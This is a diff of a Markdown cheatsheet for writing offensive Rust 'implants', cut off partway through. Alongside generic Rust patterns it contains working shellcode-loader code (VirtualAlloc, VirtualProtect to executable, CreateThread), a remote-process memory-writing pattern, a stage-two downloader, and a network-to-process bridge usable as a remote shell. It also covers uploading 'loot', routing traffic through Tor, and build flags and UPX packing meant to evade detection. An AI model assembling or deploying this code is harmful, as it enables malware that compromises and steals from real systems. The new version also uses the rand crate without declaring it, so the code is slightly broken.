@@ -13,37 +13,49 @@ render_with_liquid: false
 
 # Rust Red Team Cheatsheet
 
-A fast-reference guide for offensive Rust programming. Assumes familiarity with Rust basics; focused on patterns that appear repeatedly in red team tooling: networking, Windows API, async concurrency, cross-compilation, and binary hardening.
+Rust is increasingly the language of choice for offensive tooling. It compiles to small, fast native binaries with no runtime overhead, has a rich FFI story for calling Win32 APIs, and the borrow checker eliminates entire classes of memory bugs that would make C payloads unreliable. This cheatsheet covers everything you need to go from zero to working offensive Rust: project setup, cross-compilation, async networking, Windows APIs, cryptography, HTTP beaconing, and build-time evasion flags.
 
 ---
 
-## 1. Project Setup & Cargo
+## 1. Cargo and Project Setup
 
-### Cargo.toml — Offensive Baseline
+### Starter Cargo.toml for Offensive Tools
 
 ```toml
 [package]
-name = "tool"
-version = "0.1.0"
-edition = "2021"
+name        = "implant"
+version     = "0.1.0"
+edition     = "2021"
+description = "Red team implant"
+
+# Minimize binary metadata
+[package.metadata]
+authors = []
 
 [dependencies]
-# Async runtime
-tokio = { version = "1", features = ["full"] }
+# Async runtime — full feature set for networking, time, process, io
+tokio       = { version = "1",    features = ["full"] }
 
-# HTTP client — use rustls to avoid OpenSSL dependency
-reqwest = { version = "0.12", default-features = false, features = [
-    "json",
-    "rustls-tls",
-    "multipart",
-    "stream",
-] }
+# HTTP client — rustls for pure-Rust TLS (no OpenSSL dependency)
+reqwest     = { version = "0.12", features = ["json", "rustls-tls"], default-features = false }
 
-# Serialization
-serde = { version = "1", features = ["derive"] }
-serde_json = "1"
+# CLI argument parsing via derive macros
+clap        = { version = "4",    features = ["derive"] }
 
-# Windows API (kernel32, ntdll, advapi32, etc.)
+# Serialization / deserialization
+serde       = { version = "1",    features = ["derive"] }
+serde_json  = "1"
+
+# AES block cipher (RustCrypto)
+aes         = "0.8"
+# CBC mode
+cbc         = "0.1"
+
+# Base64 encoding/decoding
+base64      = "0.22"
+
+# Windows API bindings — list only the feature groups you need
+[target.'cfg(windows)'.dependencies]
 windows-sys = { version = "0.59", features = [
     "Win32_Foundation",
     "Win32_System_Memory",
@@ -51,380 +63,284 @@ windows-sys = { version = "0.59", features = [
     "Win32_System_Diagnostics_Debug",
     "Win32_Security",
     "Win32_System_LibraryLoader",
-    "Win32_Networking_WinSock",
+    "Win32_NetworkManagement_IpHelper",
 ] }
 
-# CLI argument parsing
-clap = { version = "4", features = ["derive"] }
+# Error handling
+anyhow      = "1"
+thiserror   = "2"
+
+# UUID generation
+uuid        = { version = "1", features = ["v4"] }
 
 # Logging
-env_logger = "0.11"
-log = "0.4"
-
-# Encoding
-base64 = "0.22"
-hex = "0.4"
-
-# Error handling
-anyhow = "1"
-thiserror = "2"
-
-# Crypto (RustCrypto)
-aes = "0.8"
-cbc = { version = "0.1", features = ["alloc"] }
-rand = "0.8"
+env_logger  = "0.11"
+log         = "0.4"
 
 [profile.release]
-opt-level = "z"
-lto = true
-codegen-units = 1
-panic = "abort"
-strip = true
+opt-level     = 3        # Full optimizations
+strip         = true     # Strip debug symbols from binary
+lto           = true     # Link-time optimization (smaller, harder to reverse)
+panic         = "abort"  # Remove panic unwinding code (smaller binary)
+codegen-units = 1        # Single codegen unit for maximum optimization
 ```
 
-### Workspace Setup (multi-crate tool suite)
+### Project Layout
 
-```toml
-# Cargo.toml (workspace root)
-[workspace]
-members = [
-    "scanner",
-    "beacon",
-    "loader",
-    "common",
-]
-resolver = "2"
-
-# Shared deps go in each crate's Cargo.toml
-# Or use workspace.dependencies (Cargo 1.64+):
-[workspace.dependencies]
-tokio   = { version = "1", features = ["full"] }
-serde   = { version = "1", features = ["derive"] }
-anyhow  = "1"
 ```
-
-### build.rs — Custom Linking
-
-```rust
-// build.rs — runs before compilation
-fn main() {
-    // Tell cargo to re-run only when this file changes
-    println!("cargo:rerun-if-changed=build.rs");
-
-    // Link a static C library bundled with the crate
-    println!("cargo:rustc-link-search=native=libs/");
-    println!("cargo:rustc-link-lib=static=helper");
-
-    // Windows: link against specific system libs
-    #[cfg(target_os = "windows")]
-    {
-        println!("cargo:rustc-link-lib=ntdll");
-        println!("cargo:rustc-link-lib=kernel32");
-    }
-
-    // Embed a resource file (icon, manifest) on Windows
-    #[cfg(target_os = "windows")]
-    {
-        let mut res = winres::WindowsResource::new();
-        res.set_manifest_file("manifest.xml");
-        res.compile().expect("Failed to compile resources");
-    }
-}
+implant/
+├── Cargo.toml
+├── .cargo/
+│   └── config.toml      # Cross-compilation linker settings
+├── src/
+│   ├── main.rs          # Entry point
+│   ├── crypto.rs        # AES encrypt/decrypt
+│   ├── network.rs       # HTTP / TCP comms
+│   ├── exec.rs          # Command execution
+│   └── platform/
+│       ├── mod.rs
+│       ├── windows.rs   # Win32 API calls
+│       └── linux.rs     # Linux-specific code
+└── build.rs             # Optional: linker script injection
 ```
 
 ---
 
 ## 2. Cross-Compilation
 
-### Target Setup
+### Install Targets
 
 ```bash
-# List installed targets
-rustup target list --installed
+# Windows targets from Linux
+rustup target add x86_64-pc-windows-gnu
+rustup target add x86_64-pc-windows-msvc    # requires MSVC linker
+rustup target add i686-pc-windows-gnu
 
-# Add common targets
-rustup target add x86_64-pc-windows-gnu     # Windows 64-bit (MinGW)
-rustup target add i686-pc-windows-gnu       # Windows 32-bit
-rustup target add x86_64-pc-windows-msvc   # Windows MSVC (needs VS)
-rustup target add aarch64-unknown-linux-musl # ARM64 Linux static
-rustup target add x86_64-unknown-linux-musl  # x86_64 Linux static
+# Linux targets
+rustup target add x86_64-unknown-linux-musl  # statically linked
+rustup target add aarch64-unknown-linux-gnu  # ARM64
 
-# Install MinGW cross-linker on Debian/Ubuntu
-sudo apt-get install gcc-mingw-w64-x86-64
-
-# Build Windows PE from Linux
-cargo build --release --target x86_64-pc-windows-gnu
+# Install mingw linker on Debian/Ubuntu
+sudo apt-get install -y gcc-mingw-w64-x86-64
 ```
 
-### .cargo/config.toml — Linker Config
+### .cargo/config.toml — Linker Setup
 
 ```toml
-# .cargo/config.toml (project root)
-
 [target.x86_64-pc-windows-gnu]
-linker = "x86_64-w64-mingw32-gcc"
-ar     = "x86_64-w64-mingw32-ar"
+linker  = "x86_64-w64-mingw32-gcc"
+ar      = "x86_64-w64-mingw32-ar"
 
-[target.aarch64-unknown-linux-musl]
-linker = "aarch64-linux-gnu-gcc"
+[target.x86_64-unknown-linux-musl]
+linker  = "x86_64-linux-musl-gcc"
 
-# Global rustflags — strip symbols in all release builds
+[target.aarch64-unknown-linux-gnu]
+linker  = "aarch64-linux-gnu-gcc"
+
+# Strip all binaries in release builds
 [profile.release]
-rustflags = ["-C", "strip=symbols"]
-
-# Or per-target:
-[target.x86_64-pc-windows-gnu]
-rustflags = [
-    "-C", "link-arg=-Wl,--strip-all",
-    "-C", "link-arg=-Wl,--subsystem,windows",  # no console window
-]
+strip = true
 ```
 
-### Strip Symbols at Build Time
+### Build Commands
 
 ```bash
-# Via RUSTFLAGS env var
-RUSTFLAGS="-C strip=symbols" cargo build --release
+# Build for Windows x64 from Linux
+cargo build --release --target x86_64-pc-windows-gnu
 
-# Or add to Cargo.toml [profile.release]
-# strip = "symbols"   # strip debug symbols only
-# strip = true        # strip everything (equivalent to "debuginfo")
+# Build static Linux binary (no glibc dependency)
+RUSTFLAGS="-C target-feature=+crt-static" \
+    cargo build --release --target x86_64-unknown-linux-musl
 
-# After build, use system strip tool
-strip target/release/tool
-x86_64-w64-mingw32-strip target/x86_64-pc-windows-gnu/release/tool.exe
+# Minimize binary size: size-optimize instead of speed-optimize
+RUSTFLAGS="-C opt-level=z" cargo build --release --target x86_64-pc-windows-gnu
 
-# Check binary size
-ls -lh target/release/tool
+# Environment variable alternative to .cargo/config.toml
+CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER=x86_64-w64-mingw32-gcc \
+    cargo build --release --target x86_64-pc-windows-gnu
 ```
 
 ---
 
-## 3. Async Networking with Tokio
+## 3. Async Networking (Tokio)
 
-### TCP Client with Timeout
+### TCP Client
 
 ```rust
 use tokio::net::TcpStream;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::time::{timeout, Duration};
-use anyhow::Result;
+use std::io;
 
-#[tokio::main]
-async fn main() -> Result<()> {
-    let addr = "192.168.1.1:4444";
+async fn connect_with_timeout(addr: &str, timeout_ms: u64) -> io::Result<TcpStream> {
+    let dur    = Duration::from_millis(timeout_ms);
+    let stream = timeout(dur, TcpStream::connect(addr))
+        .await
+        .map_err(|_| io::Error::new(io::ErrorKind::TimedOut, "connection timed out"))??;
+    Ok(stream)
+}
 
-    // Attempt connection with timeout
-    let stream = timeout(
-        Duration::from_secs(3),
-        TcpStream::connect(addr),
-    )
-    .await??; // double ? — one for timeout::Elapsed, one for io::Error
-
-    let (mut reader, mut writer) = tokio::io::split(stream);
-
-    writer.write_all(b"hello\n").await?;
-
+async fn send_recv(stream: &mut TcpStream, data: &[u8]) -> io::Result<Vec<u8>> {
+    stream.write_all(data).await?;
     let mut buf = vec![0u8; 4096];
-    let n = timeout(
-        Duration::from_secs(5),
-        reader.read(&mut buf),
-    )
-    .await??;
-
-    println!("Received: {:?}", &buf[..n]);
-    Ok(())
+    let n = stream.read(&mut buf).await?;
+    buf.truncate(n);
+    Ok(buf)
 }
 ```
 
-### TCP Listener (Handler per Connection)
+### TCP Listener
 
 ```rust
 use tokio::net::TcpListener;
-use tokio::io::{AsyncBufReadExt, BufReader};
 
-#[tokio::main]
-async fn main() -> anyhow::Result<()> {
-    let listener = TcpListener::bind("0.0.0.0:4444").await?;
-    log::info!("Listening on :4444");
-
+async fn run_listener(addr: &str) -> io::Result<()> {
+    let listener = TcpListener::bind(addr).await?;
     loop {
-        let (socket, peer) = listener.accept().await?;
-        log::info!("Connection from {peer}");
-
+        let (mut socket, peer) = listener.accept().await?;
         tokio::spawn(async move {
-            let reader = BufReader::new(socket);
-            let mut lines = reader.lines();
-            while let Ok(Some(line)) = lines.next_line().await {
-                println!("[{peer}] {line}");
+            let mut buf = [0u8; 1024];
+            loop {
+                match socket.read(&mut buf).await {
+                    Ok(0)  => break,               // connection closed
+                    Ok(n)  => { /* handle buf[..n] */ }
+                    Err(_) => break,
+                }
             }
         });
     }
 }
 ```
 
-### Semaphore for Concurrency Limiting
+### Concurrency Control with Semaphore
 
 ```rust
-use std::sync::Arc;
 use tokio::sync::Semaphore;
-use futures::future::join_all;
+use std::sync::Arc;
 
-async fn scan_with_limit(targets: Vec<String>, max_concurrency: usize) {
-    let sem = Arc::new(Semaphore::new(max_concurrency));
-    let mut handles = Vec::new();
+// Allow at most 100 concurrent connections
+let sem = Arc::new(Semaphore::new(100));
 
-    for target in targets {
-        let permit = Arc::clone(&sem).acquire_owned().await.unwrap();
-        let handle = tokio::spawn(async move {
-            let _permit = permit; // dropped at end of task
-            probe(&target).await
-        });
-        handles.push(handle);
-    }
-
-    let results: Vec<_> = join_all(handles).await;
-    for r in results {
-        if let Ok(Ok(result)) = r {
-            println!("{result:?}");
-        }
-    }
-}
-
-async fn probe(target: &str) -> anyhow::Result<String> {
-    // do work
-    Ok(target.to_string())
+for target in targets {
+    let sem   = Arc::clone(&sem);
+    let target = target.clone();
+    tokio::spawn(async move {
+        let _permit = sem.acquire().await.unwrap();  // blocks when full
+        // do work — permit released when _permit drops
+        scan_target(&target).await;
+    });
 }
 ```
 
-### join_all / select! Patterns
+### tokio::select! for Bidirectional I/O
 
 ```rust
-use tokio::select;
+use tokio::io::{AsyncBufReadExt, BufReader};
 
-// Run two async tasks, take whichever completes first
-async fn race_example() {
-    select! {
-        result = connect_primary() => {
-            println!("Primary won: {result:?}");
-        }
-        result = connect_fallback() => {
-            println!("Fallback won: {result:?}");
+async fn bridge(mut net: TcpStream, mut proc_stdout: tokio::process::ChildStdout) {
+    let (net_read, mut net_write) = net.split();
+    let mut net_lines  = BufReader::new(net_read).lines();
+    let mut proc_lines = BufReader::new(proc_stdout).lines();
+
+    loop {
+        tokio::select! {
+            line = net_lines.next_line() => {
+                match line {
+                    Ok(Some(cmd)) => { /* send cmd to process stdin */ }
+                    _             => break,
+                }
+            }
+            line = proc_lines.next_line() => {
+                match line {
+                    Ok(Some(out)) => {
+                        net_write.write_all(out.as_bytes()).await.ok();
+                    }
+                    _ => break,
+                }
+            }
         }
     }
 }
-
-async fn connect_primary() -> anyhow::Result<()> { Ok(()) }
-async fn connect_fallback() -> anyhow::Result<()> { Ok(()) }
 ```
 
 ---
 
-## 4. Windows API with windows-sys
+## 4. Windows API (windows-sys)
 
-### Common Imports
+### Required Cargo.toml Features
 
-```rust
-use windows_sys::Win32::Foundation::{
-    HANDLE, BOOL, FALSE, INVALID_HANDLE_VALUE, CloseHandle,
-};
-use windows_sys::Win32::System::Memory::{
-    VirtualAlloc, VirtualFree, VirtualProtect,
-    MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
-    PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
-};
-use windows_sys::Win32::System::Threading::{
-    OpenProcess, CreateRemoteThread, WaitForSingleObject,
-    PROCESS_ALL_ACCESS, INFINITE,
-};
-use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
-use windows_sys::Win32::System::LibraryLoader::{
-    GetModuleHandleA, GetProcAddress,
-};
+```toml
+[target.'cfg(windows)'.dependencies]
+windows-sys = { version = "0.59", features = [
+    "Win32_Foundation",           # HANDLE, BOOL, LPVOID, etc.
+    "Win32_System_Memory",        # VirtualAlloc, VirtualProtect
+    "Win32_System_Threading",     # CreateThread, OpenProcess
+    "Win32_System_Diagnostics_Debug",  # WriteProcessMemory
+    "Win32_Security",             # Privileges, SIDs
+    "Win32_System_LibraryLoader", # GetModuleHandle, GetProcAddress
+] }
 ```
 
-### Error Handling with GetLastError
+### Common Win32 Patterns
 
 ```rust
-use windows_sys::Win32::Foundation::GetLastError;
-use std::ptr;
-
-fn check_handle(h: HANDLE) -> anyhow::Result<HANDLE> {
-    if h == 0 || h == INVALID_HANDLE_VALUE {
-        let err = unsafe { GetLastError() };
-        anyhow::bail!("WinAPI call failed with error code: {:#010x}", err);
-    }
-    Ok(h)
-}
-
-// Usage
-fn open_target(pid: u32) -> anyhow::Result<HANDLE> {
-    let handle = unsafe {
-        OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)
+#[cfg(windows)]
+mod win32 {
+    use windows_sys::Win32::Foundation::{HANDLE, BOOL, FALSE, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::System::Memory::{
+        VirtualAlloc, VirtualProtect,
+        MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
     };
-    check_handle(handle)
-}
-```
+    use windows_sys::Win32::System::Threading::{
+        CreateThread, WaitForSingleObject, INFINITE,
+    };
+    use windows_sys::Win32::System::Diagnostics::Debug::{
+        WriteProcessMemory,
+    };
+    use std::ptr;
+    use std::ffi::c_void;
 
-### VirtualAlloc / WriteProcessMemory Pattern
+    /// Allocate RW memory, copy shellcode, flip to RX, execute in new thread.
+    pub unsafe fn inject_shellcode(shellcode: &[u8]) -> bool {
+        // 1. Allocate RW memory for shellcode
+        let base = VirtualAlloc(
+            ptr::null(),
+            shellcode.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+        if base.is_null() { return false; }
 
-```rust
-use std::ffi::c_void;
+        // 2. Copy shellcode bytes
+        ptr::copy_nonoverlapping(shellcode.as_ptr(), base as *mut u8, shellcode.len());
 
-unsafe fn alloc_and_write(pid: u32, data: &[u8]) -> anyhow::Result<*mut c_void> {
-    let proc = check_handle(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid))?;
+        // 3. Make memory executable (RX)
+        let mut old_protect: u32 = 0;
+        let ok = VirtualProtect(base, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect);
+        if ok == FALSE { return false; }
 
-    // Allocate RW memory in target process
-    let remote_buf = VirtualAlloc(
-        ptr::null(),
-        data.len(),
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE,
-    );
+        // 4. Spawn a thread to execute the shellcode
+        let thread = CreateThread(
+            ptr::null(),            // security attributes
+            0,                      // default stack size
+            Some(std::mem::transmute(base)), // function pointer
+            ptr::null(),            // parameter
+            0,                      // creation flags
+            ptr::null_mut(),        // thread ID output
+        );
+        if thread == 0 || thread == INVALID_HANDLE_VALUE {
+            return false;
+        }
 
-    if remote_buf.is_null() {
-        anyhow::bail!("VirtualAlloc failed: {:#x}", GetLastError());
+        // 5. Wait for thread to finish
+        WaitForSingleObject(thread, INFINITE);
+        true
     }
 
-    // Write data
-    let mut written = 0usize;
-    let ok = WriteProcessMemory(
-        proc,
-        remote_buf,
-        data.as_ptr() as *const c_void,
-        data.len(),
-        &mut written,
-    );
-
-    if ok == FALSE {
-        anyhow::bail!("WriteProcessMemory failed: {:#x}", GetLastError());
+    /// Check last Win32 error
+    pub fn last_error() -> u32 {
+        unsafe { windows_sys::Win32::Foundation::GetLastError() }
     }
-
-    // Change protection to RX
-    let mut old_protect = 0u32;
-    VirtualProtect(remote_buf, data.len(), PAGE_EXECUTE_READ, &mut old_protect);
-
-    CloseHandle(proc);
-    Ok(remote_buf)
-}
-```
-
-### Dynamic Function Resolution
-
-```rust
-use std::ffi::CString;
-
-unsafe fn get_proc(module: &str, func: &str) -> anyhow::Result<unsafe extern "system" fn() -> isize> {
-    let mod_name = CString::new(module)?;
-    let func_name = CString::new(func)?;
-
-    let hmod = GetModuleHandleA(mod_name.as_ptr() as *const u8);
-    if hmod == 0 {
-        anyhow::bail!("Module {} not found", module);
-    }
-
-    let addr = GetProcAddress(hmod, func_name.as_ptr() as *const u8);
-    addr.ok_or_else(|| anyhow::anyhow!("Function {} not found", func))
 }
 ```
 
@@ -432,339 +348,280 @@ unsafe fn get_proc(module: &str, func: &str) -> anyhow::Result<unsafe extern "sy
 
 ## 5. FFI and Unsafe Patterns
 
-### extern Blocks
+### Calling C Functions
 
 ```rust
-// Calling a C library function
+use std::ffi::{CString, CStr};
+use std::os::raw::{c_char, c_int, c_void};
+
+// Declare external C functions
 extern "C" {
-    fn strlen(s: *const i8) -> usize;
-    fn memcpy(dst: *mut u8, src: *const u8, n: usize) -> *mut u8;
+    fn strlen(s: *const c_char) -> usize;
+    fn malloc(size: usize) -> *mut c_void;
+    fn free(ptr: *mut c_void);
 }
 
-// Windows calling convention (stdcall)
+// Using CString: Rust String → null-terminated C string
+fn rust_to_c(s: &str) -> CString {
+    CString::new(s).expect("CString::new failed — interior null byte")
+}
+
+// Using CStr: raw C pointer → Rust &str
+unsafe fn c_to_rust(ptr: *const c_char) -> &'static str {
+    CStr::from_ptr(ptr)
+        .to_str()
+        .expect("invalid UTF-8 in C string")
+}
+
+// Reading raw memory as a slice
+unsafe fn read_buffer(ptr: *const u8, len: usize) -> &'static [u8] {
+    std::slice::from_raw_parts(ptr, len)
+}
+
+// Windows "system" calling convention
 extern "system" {
-    fn MessageBoxA(hwnd: isize, text: *const u8, caption: *const u8, utype: u32) -> i32;
-}
-
-fn show_msgbox() {
-    use std::ffi::CString;
-    let text = CString::new("Hello").unwrap();
-    let cap  = CString::new("Caption").unwrap();
-    unsafe {
-        MessageBoxA(0, text.as_ptr() as _, cap.as_ptr() as _, 0);
-    }
+    fn MessageBoxW(
+        hwnd:    *mut c_void,
+        text:    *const u16,
+        caption: *const u16,
+        utype:   u32,
+    ) -> c_int;
 }
 ```
 
-### Raw Pointers & from_raw_parts
+### transmute for Function Pointers
 
 ```rust
-fn slice_from_raw(ptr: *const u8, len: usize) -> &'static [u8] {
-    // SAFETY: caller guarantees ptr is valid for len bytes and lives long enough
-    unsafe { std::slice::from_raw_parts(ptr, len) }
-}
-
-fn mutate_raw(ptr: *mut u8, len: usize) {
-    let slice = unsafe { std::slice::from_raw_parts_mut(ptr, len) };
-    for b in slice.iter_mut() {
-        *b ^= 0xAA; // XOR each byte
-    }
-}
-```
-
-### MaybeUninit for Uninitialized Buffers
-
-```rust
-use std::mem::MaybeUninit;
-
-fn read_into_uninit() {
-    // Avoid zero-initializing a large buffer
-    let mut buf: [MaybeUninit<u8>; 4096] = unsafe { MaybeUninit::uninit().assume_init() };
-
-    // Fill it (e.g., via a C API call that writes to the buffer)
-    // ... FFI call writes into buf.as_mut_ptr() ...
-
-    // Assume initialized after the call
-    let initialized: &[u8] = unsafe {
-        std::slice::from_raw_parts(buf.as_ptr() as *const u8, 4096)
-    };
-    println!("First byte: {:#x}", initialized[0]);
-}
-```
-
-### transmute (Use Sparingly)
-
-```rust
-// Cast a function pointer received as usize back to a callable
-unsafe fn call_shellcode(addr: usize) {
-    // transmute the address to a function pointer
-    let f: extern "C" fn() = std::mem::transmute(addr);
+// Cast a raw pointer to a function pointer — use sparingly
+unsafe fn call_as_fn(addr: *const u8) {
+    type ShellcodeFn = unsafe extern "C" fn();
+    let f: ShellcodeFn = std::mem::transmute(addr);
     f();
-}
-
-// Reinterpret bytes as a struct (must match alignment/size exactly)
-#[repr(C)]
-struct Header {
-    magic: u32,
-    length: u32,
-}
-
-unsafe fn parse_header(bytes: &[u8]) -> Header {
-    debug_assert!(bytes.len() >= std::mem::size_of::<Header>());
-    std::ptr::read_unaligned(bytes.as_ptr() as *const Header)
 }
 ```
 
 ---
 
-## 6. HTTP Client (reqwest)
-
-### Client Builder
+## 6. Cryptography (RustCrypto — aes + cbc)
 
 ```rust
-use reqwest::{Client, Proxy};
-use std::time::Duration;
-use anyhow::Result;
+use aes::Aes256;
+use cbc::{Encryptor, Decryptor};
+use cbc::cipher::{BlockEncryptMut, BlockDecryptMut, KeyIvInit, block_padding::Pkcs7};
+use aes::cipher::generic_array::GenericArray;
 
-fn build_client() -> Result<Client> {
-    let client = Client::builder()
-        .timeout(Duration::from_secs(10))
-        .connect_timeout(Duration::from_secs(5))
-        // Route through SOCKS5 proxy
-        .proxy(Proxy::all("socks5://127.0.0.1:9050")?)
-        // Accept invalid certs (useful for internal infra)
-        .danger_accept_invalid_certs(true)
-        // Custom user-agent
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-        // Disable system root store, use embedded certs
-        .tls_built_in_root_certs(true)
-        .build()?;
-    Ok(client)
+type Aes256CbcEnc = Encryptor<Aes256>;
+type Aes256CbcDec = Decryptor<Aes256>;
+
+/// Encrypt plaintext with AES-256-CBC. Returns IV (16 bytes) + ciphertext.
+pub fn encrypt(key: &[u8; 32], iv: &[u8; 16], plaintext: &[u8]) -> Vec<u8> {
+    let key_ga = GenericArray::from_slice(key);
+    let iv_ga  = GenericArray::from_slice(iv);
+    let cipher = Aes256CbcEnc::new(key_ga, iv_ga);
+
+    // encrypt_padded_vec_mut allocates and handles PKCS7 padding
+    let ciphertext = cipher.encrypt_padded_vec_mut::<Pkcs7>(plaintext);
+
+    // Prepend IV so the receiver can decrypt without an out-of-band channel
+    let mut output = Vec::with_capacity(16 + ciphertext.len());
+    output.extend_from_slice(iv);
+    output.extend_from_slice(&ciphertext);
+    output
+}
+
+/// Decrypt an AES-256-CBC blob with prepended IV.
+pub fn decrypt(key: &[u8; 32], blob: &[u8]) -> anyhow::Result<Vec<u8>> {
+    anyhow::ensure!(blob.len() > 16, "blob too short to contain IV");
+    let (iv_bytes, cipher_bytes) = blob.split_at(16);
+
+    let key_ga = GenericArray::from_slice(key);
+    let iv_ga  = GenericArray::from_slice(iv_bytes);
+    let cipher = Aes256CbcDec::new(key_ga, iv_ga);
+
+    cipher
+        .decrypt_padded_vec_mut::<Pkcs7>(cipher_bytes)
+        .map_err(|e| anyhow::anyhow!("decryption failed: {:?}", e))
+}
+
+// Generate a random IV
+use rand::RngCore;
+fn random_iv() -> [u8; 16] {
+    let mut iv = [0u8; 16];
+    rand::thread_rng().fill_bytes(&mut iv);
+    iv
 }
 ```
 
-### Async GET / POST
+---
+
+## 7. HTTP Client (reqwest)
 
 ```rust
-use reqwest::Client;
-use serde_json::Value;
+use reqwest::{Client, Proxy, header};
+use std::time::Duration;
 
-async fn get_json(client: &Client, url: &str) -> anyhow::Result<Value> {
-    let resp = client.get(url)
-        .header("Authorization", "Bearer secrettoken")
-        .send()
-        .await?
-        .error_for_status()?;  // returns Err on 4xx/5xx
+/// Build a configured reqwest Client.
+async fn build_client(
+    proxy_url: Option<&str>,
+    skip_tls:  bool,
+) -> anyhow::Result<Client> {
+    let mut builder = Client::builder()
+        .timeout(Duration::from_secs(30))
+        .danger_accept_invalid_certs(skip_tls)  // lab use only
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
 
-    Ok(resp.json::<Value>().await?)
+    if let Some(url) = proxy_url {
+        builder = builder.proxy(Proxy::all(url)?);
+    }
+
+    Ok(builder.build()?)
 }
 
-async fn post_data(client: &Client, url: &str, body: &Value) -> anyhow::Result<Vec<u8>> {
-    let bytes = client.post(url)
-        .json(body)
-        .send()
-        .await?
-        .error_for_status()?
-        .bytes()
-        .await?;
+/// POST JSON and receive a JSON response.
+async fn post_json<T: serde::Serialize, R: serde::de::DeserializeOwned>(
+    client:   &Client,
+    url:      &str,
+    payload:  &T,
+    auth_hdr: Option<&str>,
+) -> anyhow::Result<R> {
+    let mut req = client.post(url).json(payload);
 
+    if let Some(token) = auth_hdr {
+        req = req.header(header::AUTHORIZATION, format!("Bearer {token}"));
+    }
+
+    let resp = req.send().await?.error_for_status()?;
+    Ok(resp.json::<R>().await?)
+}
+
+/// Download raw bytes (shellcode, stage2, etc.)
+async fn download_bytes(client: &Client, url: &str) -> anyhow::Result<Vec<u8>> {
+    let bytes = client.get(url).send().await?.error_for_status()?.bytes().await?;
     Ok(bytes.to_vec())
 }
 ```
 
-### Custom Headers & Multipart
+---
+
+## 8. Error Handling
+
+### anyhow for Application Code
 
 ```rust
-use reqwest::multipart;
+use anyhow::{Context, Result};
 
-async fn upload_file(client: &Client, url: &str, data: Vec<u8>) -> anyhow::Result<()> {
-    let part = multipart::Part::bytes(data)
-        .file_name("loot.zip")
-        .mime_str("application/octet-stream")?;
+fn read_config(path: &str) -> Result<String> {
+    std::fs::read_to_string(path)
+        .with_context(|| format!("failed to read config file: {path}"))
+}
 
-    let form = multipart::Form::new().part("file", part);
-
-    client.post(url)
-        .multipart(form)
-        .send()
-        .await?
-        .error_for_status()?;
-
+async fn run() -> Result<()> {
+    let cfg = read_config("config.json")?;
+    // ? operator propagates anyhow::Error with context
     Ok(())
 }
 ```
 
----
-
-## 7. Serialization (serde)
-
-### Derive Macros
-
-```rust
-use serde::{Serialize, Deserialize};
-
-#[derive(Debug, Serialize, Deserialize)]
-struct ScanResult {
-    host: String,
-    port: u16,
-    open: bool,
-    #[serde(skip_serializing_if = "Option::is_none")]
-    banner: Option<String>,
-    #[serde(rename = "timestamp_utc")]
-    timestamp: u64,
-}
-```
-
-### serde_json — Value and Dynamic JSON
-
-```rust
-use serde_json::{json, Value};
-
-fn build_payload(id: &str, data: &[u8]) -> Value {
-    json!({
-        "id": id,
-        "output": base64::engine::general_purpose::STANDARD.encode(data),
-        "ts": std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .unwrap()
-            .as_secs(),
-    })
-}
-
-fn parse_arbitrary(raw: &str) -> anyhow::Result<()> {
-    let v: Value = serde_json::from_str(raw)?;
-    if let Some(cmd) = v["command"].as_str() {
-        println!("Command: {cmd}");
-    }
-    Ok(())
-}
-```
-
-### Pretty-Print Output for Tools
-
-```rust
-fn print_results<T: serde::Serialize>(results: &[T]) -> anyhow::Result<()> {
-    let json = serde_json::to_string_pretty(results)?;
-    println!("{json}");
-    Ok(())
-}
-```
-
----
-
-## 8. Build Optimization for Evasion
-
-### profile.release Settings
-
-```toml
-[profile.release]
-# Optimization level: "z" = size, "s" = slightly larger but faster, 3 = speed
-opt-level    = "z"
-# Link-time optimization (slower build, smaller/faster binary)
-lto          = true
-# Single codegen unit — required for full LTO
-codegen-units = 1
-# abort on panic instead of unwinding (removes panic infrastructure)
-panic        = "abort"
-# Strip debug symbols
-strip        = true
-# Enable incremental builds only for dev
-incremental  = false
-```
-
-### Reducing PE Size Further
-
-```bash
-# After cross-compiling, UPX-pack the binary (adds one layer of packing)
-upx --best --lzma tool.exe
-
-# Remove RTTI, exception handling tables (MSVC target — via rustflags)
-# For GNU target, pass linker flags:
-RUSTFLAGS="-C link-arg=-Wl,--gc-sections -C link-arg=-Wl,--strip-all" \
-    cargo build --release --target x86_64-pc-windows-gnu
-
-# Check what's in the binary — look for strings, imports
-strings tool.exe | grep -i "rust\|panic\|cargo"
-objdump -d tool.exe | head -100
-```
-
-### no_std Considerations
-
-```rust
-// For a no_std binary (kernel drivers, embedded — rare in red team but possible)
-#![no_std]
-#![no_main]
-
-// Must provide panic handler
-#[panic_handler]
-fn panic(_info: &core::panic::PanicInfo) -> ! {
-    loop {}
-}
-
-// Entry point for Windows no_std
-#[no_mangle]
-pub unsafe extern "system" fn DllMain(_: *mut u8, _: u32, _: *mut u8) -> i32 { 1 }
-```
-
----
-
-## 9. Error Handling Patterns
-
-### anyhow::Result — Quick & Flexible
-
-```rust
-use anyhow::{Result, Context, bail, anyhow};
-
-fn parse_port(s: &str) -> Result<u16> {
-    s.parse::<u16>()
-        .context(format!("Invalid port number: '{s}'"))
-}
-
-fn require_env(key: &str) -> Result<String> {
-    std::env::var(key).with_context(|| format!("Missing env var: {key}"))
-}
-
-fn check_range(n: u16) -> Result<u16> {
-    if n == 0 {
-        bail!("Port cannot be 0");
-    }
-    Ok(n)
-}
-```
-
-### thiserror — Typed Errors for Libraries
+### thiserror for Library / Module Error Types
 
 ```rust
 use thiserror::Error;
 
 #[derive(Debug, Error)]
-pub enum ToolError {
-    #[error("Connection to {host}:{port} failed: {source}")]
